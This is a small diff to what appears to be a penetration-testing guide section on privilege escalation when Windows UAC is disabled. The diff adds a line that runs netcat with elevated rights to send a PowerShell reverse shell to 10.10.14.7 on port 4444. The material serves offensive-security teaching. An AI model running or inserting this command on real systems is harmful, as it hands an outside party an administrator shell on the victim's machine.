@@ -141,6 +141,7 @@ If UAC is already disabled \(**`ConsentPromptBehaviorAdmin`**is **`0`**\) you ca
 ```bash
 #Put your reverse shell instead of "calc.exe"
 Start-Process powershell -Verb runAs "calc.exe"
+Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
 ```
 
 #### UAC bypass exploits
